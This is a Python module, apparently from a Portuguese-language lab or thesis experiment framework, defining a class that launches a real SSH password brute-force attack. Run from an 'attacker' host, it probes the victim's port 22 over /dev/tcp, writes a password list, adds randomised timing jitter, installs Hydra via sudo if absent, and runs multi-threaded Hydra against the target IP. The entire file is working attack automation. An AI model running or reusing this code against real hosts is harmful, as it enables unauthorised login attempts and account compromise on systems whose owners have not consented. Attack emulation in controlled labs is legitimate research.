import logging
import shlex
import random

logger = logging.getLogger("[Action:BRUTE_SSH]")

class HydraBruteAction:
    def __init__(self, user="tcc", pass_list=None, output="~/exp_brute/hydra_ssh.log", threads=4, **kwargs):
        self.user = user
        self.pass_list = list(pass_list) if isinstance(pass_list, (list, tuple)) else pass_list
        self.output = output if output else "~/exp_brute/hydra_ssh.log"
        self.threads = int(threads)
        self._extra = kwargs

    def _escape_dq(self, s: str) -> str:
        return s.replace("\\", "\\\\").replace('"', '\\"')

    def _build_user_opt(self, user: str) -> str:
        if not isinstance(user, str) or not user.strip():
            return "-l tcc"
        u = user.strip()
        if u.startswith("~") or ("/" in u) or ("\\" in u):
            return f"-L {u}"
        return f"-l {shlex.quote(u)}"

    def _build_pass_opt_and_prep(self, pass_list, attempts: int) -> tuple[str, str, bool]:
        if isinstance(pass_list, (list, tuple)):
            pw = list(pass_list)
            random.shuffle(pw)
            if attempts > 0:
                pw = pw[:attempts]
            if not pw:
                pw = ["123456", "password"]
            quoted = ' '.join([f"\"{self._escape_dq(str(p))}\"" for p in pw])
            prep = "PW_FILE=$(mktemp /tmp/hydra_pw_XXXX.txt); printf '%s\\n' " + quoted + " > \"$PW_FILE\""
            return prep, "-P \"$PW_FILE\"", True

        if isinstance(pass_list, str) and pass_list.strip():
            path = pass_list.strip()
            if path.startswith("~/"):
                path_shell = "\"${HOME}/" + self._escape_dq(path[2:]) + "\""
            else:
                path_shell = shlex.quote(path)
            return "", f"-P {path_shell}", False

        prep = "PW_FILE=$(mktemp /tmp/hydra_pw_XXXX.txt); printf '%s\\n' \"123456\" \"password\" > \"$PW_FILE\""
        return prep, "-P \"$PW_FILE\"", True

    def run(self, attacker_ssh, victim_ip: str, workload=None, **kwargs):
        workload = workload or {}
        threads = int(workload.get("max_parallel_bruteforce", self.threads))
        attempts = int(workload.get("ssh_attempts", 0))  # 0 = sem limite
        jitter = workload.get("jitter_ms", [60, 180])

        if isinstance(jitter, (list, tuple)) and len(jitter) >= 2:
            jmin = max(0, int(jitter[0]))
            jmax = max(0, int(jitter[1]))
            if jmin > jmax:
                jmin, jmax = jmax, jmin
        else:
            jmin, jmax = 60, 180

        if not victim_ip or not str(victim_ip).strip():
            logger.error("[Action:BRUTE_SSH] target_ip vazio")
            raise ValueError("target_ip vazio para HydraBruteAction")

        try:
            user_opt = self._build_user_opt(self.user)
            prep_pw, p_opt, created_temp = self._build_pass_opt_and_prep(self.pass_list, attempts)

            out_raw = (self.output or "").strip() or "~/exp_brute/hydra_ssh.log"
            if out_raw.endswith("/"):
                out_raw += "hydra_ssh.log"
            if "/" in out_raw and "." not in out_raw.split("/")[-1]:
                out_raw += ".log"
            out_shell = "\"${HOME}/" + self._escape_dq(out_raw[2:]) + "\"" if out_raw.startswith("~/") else shlex.quote(out_raw)

            jitter_cmd = ""
            if jmax > 0:
                jmin_s = f"{jmin/1000.0:.3f}"
                jmax_s = f"{jmax/1000.0:.3f}"
                jitter_cmd = f"python3 -c \"import random,time; time.sleep(random.uniform({jmin_s},{jmax_s}))\"; "

            logger.info(f"[Action:BRUTE_SSH] threads={threads} alvo={victim_ip}")
            logger.info(f"[Action:BRUTE_SSH] output => {out_raw}")

            ip_q = shlex.quote(str(victim_ip))
            parts = []
            parts.append("bash -lc '")
            parts.append("set -e; ")
            parts.append(f"IP={ip_q}; ")
            parts.append(f"OUT={out_shell}; ")
            parts.append("mkdir -p \"$(dirname \"$OUT\")\"; ")

            if prep_pw:
                parts.append(prep_pw + "; ")
                parts.append("[ -n \"${PW_FILE:-}\" ] && [ -s \"$PW_FILE\" ] || (echo \"[BRUTE_SSH] PW_FILE não criado/vazio\" >&2; exit 3); ")

            parts.append("if timeout 3 bash -lc \"</dev/tcp/$IP/22\"; then echo \"[BRUTE_SSH] Probe 22/tcp: OPEN\"; else echo \"[BRUTE_SSH] Probe 22/tcp: CLOSED/FILTERED\" >&2; exit 110; fi; ")

            if jitter_cmd:
                parts.append(jitter_cmd)

            parts.append("if ! command -v hydra >/dev/null 2>&1; then ")
            parts.append("sudo DEBIAN_FRONTEND=noninteractive apt-get update -y && ")
            parts.append("sudo DEBIAN_FRONTEND=noninteractive apt-get install -y hydra; ")
            parts.append("fi; ")

            # AQUI: execução real do Hydra (antes estava comentada)
            parts.append(f"hydra {user_opt} {p_opt} ssh://$IP -t {threads} -f -I -o \"$OUT\"; ")

            if created_temp:
                parts.append("if [ -n \"${PW_FILE:-}\" ] && echo \"$PW_FILE\" | grep -q '^/tmp/hydra_pw_'; then rm -f \"$PW_FILE\"; fi; ")

            parts.append("'")

            cmd = "".join(parts)
            attacker_ssh.run_command("attacker", cmd, timeout=1800)
            logger.info("[Action:BRUTE_SSH] Hydra finalizado com sucesso")
        except Exception as e:
            logger.error(f"[Action:BRUTE_SSH] Falhou: {e}")
            raise
